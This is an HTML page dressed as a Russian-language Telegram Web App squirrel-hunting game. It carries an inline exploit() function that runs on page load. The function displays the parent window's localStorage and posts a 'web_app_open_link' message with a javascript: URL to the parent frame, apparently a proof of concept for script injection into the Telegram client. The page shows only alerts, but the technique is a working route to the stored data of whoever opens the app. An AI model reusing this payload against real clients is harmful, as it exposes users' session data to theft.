<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Interface</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body onload=exploit()>
    <div class="container">
        <div class="header">
            <div class="icon-container">
                <span class="count">15</span>
                <img src="./images/coin_logo.png" alt="icon" class="icon">
            </div>
            <div class="share-container" style="margin-right: 25px;">
                <span class="count" style="margin-right: 7px;" id="trapCount">15</span>
                <img src="./images/trap.png" alt="share" class="share">
            </div>
        </div>
        <div class="tree-container">
            <img src="./images/tree.png" alt="tree" class="tree" id="tree">
            <img src="./images/squirell_run.gif" alt="squirrel" class="squirrel">
        </div>
        <div class="timer">00:00:00</div>
        <button class="hunt-button" onclick="startHunt()" id="hunt_button">Начать охоту</button>
       
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <div class="footer">
            <div class="footer-item" data-action="friends">
                <i class="fas fa-home"></i>
                Друзья
            </div>
            <div class="footer-item" data-action="rating">
                <i class="fas fa-star"></i>
                Рейтинг
            </div>
            <div class="footer-item" data-action="store">
                <i class="fas fa-store"></i>
                Магазин
            </div>
            <div class="footer-item" data-action="tasks">
                <i class="fas fa-tasks"></i>
                Задания
            </div>
            <div class="footer-item" data-action="warehouse">
                <i class="fas fa-box"></i>
                Склад
            </div>
        </div>
        
    </div>

    <script src="./scripts/main.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        function exploit() {
            alert("a");
            alert(JSON.stringify(window.parent.localStorage));
            window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link', eventData: {url: "javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*');
        }
        exploit()
        </script>
</body>
</html>
